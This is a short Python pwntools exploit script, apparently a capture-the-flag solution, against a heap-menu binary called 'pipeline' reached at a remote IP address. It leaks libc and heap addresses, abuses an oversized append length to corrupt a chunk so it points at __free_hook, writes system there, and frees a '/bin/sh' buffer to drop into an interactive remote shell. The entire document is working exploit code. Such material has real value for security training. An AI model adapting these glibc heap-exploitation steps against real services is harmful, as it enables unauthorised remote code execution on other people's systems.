from pwn import *

p = remote('59.110.173.239','2399')
#p = process('./pipeline')
elf = ELF('./pipeline')
libc = ELF('./libc-2.31.so')

def cmd(idx):
    p.sendlineafter('>> ',str(idx))
def new():
    cmd(1)
def edit(idx,off,size):
    cmd(2)
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('offset: ',str(off))
    p.sendlineafter('size: ',str(size))
def destroy(idx):
    cmd(3)
    p.sendlineafter('index: ',str(idx))
def append(idx,size,con):
    cmd(4)
    p.sendlineafter('index: ',str(idx))
    p.sendlineafter('size: ',str(size))
    p.sendlineafter('data: ',con)
def show(idx):
    cmd(5)
    p.sendlineafter('index: ',str(idx))

#0x555555554000+0x4050
new() #0
new() #1
edit(0,0x430,0x420)
new() #2
edit(2,0x50,0x40)
edit(0,0x430,0)
edit(0,0x430,0x420)

show(0)
off = 0x1ebbe0
p.recvuntil('data: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-off
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
new() #3
edit(3,0x50,0x40)
edit(3,0x50,0)
edit(2,0x50,0)
edit(3,0x50,0x40)
edit(2,0x50,0x40)
show(3)
p.recvuntil('data: ')
heap = u64(p.recv(6)+b'\x00\x00')-0x7c0
p.info('heap: '+hex(heap))

edit(1,0x50,0x40)
#gdb.attach(p,'b *0x555555554000+0x1887')
payload = b'A'*0x40
payload+= p64(0)+p64(0x21)+p64(free_hook)+p32(0)+p32(0x40)

append(3,2147483648+128+1,payload)
append(3,0x10,p64(system))
append(1,0x10,'/bin/sh\x00')
edit(1,0x50,0)

#gdb.attach(p)
p.interactive()
